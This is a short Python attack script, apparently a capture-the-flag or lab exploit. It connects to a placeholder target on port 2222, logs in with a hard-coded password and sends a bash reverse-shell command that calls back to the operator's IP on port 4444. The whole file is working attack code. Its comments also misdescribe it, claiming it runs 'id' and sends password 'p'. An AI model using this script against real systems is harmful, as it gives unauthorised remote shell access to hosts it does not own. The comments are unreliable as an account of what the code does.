import socket

def exploit():
    target_ip = "TARGET_IP_HERE"
    target_port = 2222  # The service port
    password = "password"  # The password to gain access
    command = "bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1"

    try:
        # 1. Create the socket and connect
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, target_port))

        # 2. Receive the initial banner/welcome message
        banner = s.recv(1024).decode()
        print(f"[*] Banner: {banner.strip()}")

        # 3. Send the password 'p' to gain access
        print(f"[*] Sending password: {password}")
        s.sendall(f"{password}\n".encode())

        # 4. Receive the response after entering the password
        response = s.recv(1024).decode()
        print(f"[*] Server Response: {response.strip()}")

        # 5. Execute the "id" command
        print(f"[*] Executing command: {command}")
        s.sendall(f"{command}\n".encode())

        # 6. Capture and print the final output
        final_output = s.recv(1024).decode()
        print(f"[+] Output of 'id':\n{final_output}")

        s.close()

    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    exploit()